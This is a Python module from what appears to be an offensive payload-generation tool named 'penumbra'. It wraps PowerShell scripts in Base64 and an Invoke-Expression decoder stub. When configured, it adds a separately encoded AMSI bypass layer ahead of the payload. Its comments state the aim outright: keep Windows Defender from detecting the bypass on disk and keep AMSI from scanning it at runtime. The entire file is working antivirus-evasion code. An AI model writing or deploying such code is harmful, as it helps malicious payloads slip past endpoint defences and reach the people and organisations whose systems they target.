"""PS1 Base64 encode pass — wraps script in decode + Invoke-Expression stub.

When an AMSI technique is configured, the bypass is encoded in its own
Base64+IEX layer that runs first. This avoids both:
- Static detection of the bypass pattern in the .ps1 file on disk
- AMSI scanning the bypass inside the payload IEX
"""

from __future__ import annotations

import base64

from penumbra.types import PassConfig


def _encode_iex(script: str) -> str:
    """Encode a PS1 script as Base64 + Invoke-Expression one-liner."""
    encoded = base64.b64encode(script.encode("utf-8")).decode("ascii")
    return (
        "$d = [System.Text.Encoding]::UTF8.GetString("
        f"[System.Convert]::FromBase64String('{encoded}'));"
        "Invoke-Expression $d"
    )


class Base64EncodePass:
    """Encode a PS1 script as UTF-8 Base64 with an IEX decoder stub.

    If config.extra["amsi_technique"] is set, the AMSI bypass is
    encoded in a separate Base64+IEX block that runs first.
    """

    @property
    def name(self) -> str:
        return "encode"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        payload_encoded = base64.b64encode(data).decode("ascii")

        # Build the payload IEX
        payload_iex = (
            "$d = [System.Text.Encoding]::UTF8.GetString("
            f"[System.Convert]::FromBase64String('{payload_encoded}'))\n"
            "Invoke-Expression $d\n"
        )

        # If AMSI technique configured, prepend an encoded bypass block.
        # The bypass itself is Base64-encoded so Defender can't detect it
        # via static file scanning.
        technique = config.extra.get("amsi_technique")
        if technique:
            from penumbra.ps.amsi import _GENERATORS

            gen = _GENERATORS.get(str(technique))
            if gen:
                bypass_script = gen()
                bypass_iex = _encode_iex(bypass_script)
                return (bypass_iex + "\n" + payload_iex).encode("utf-8")

        return payload_iex.encode("utf-8")
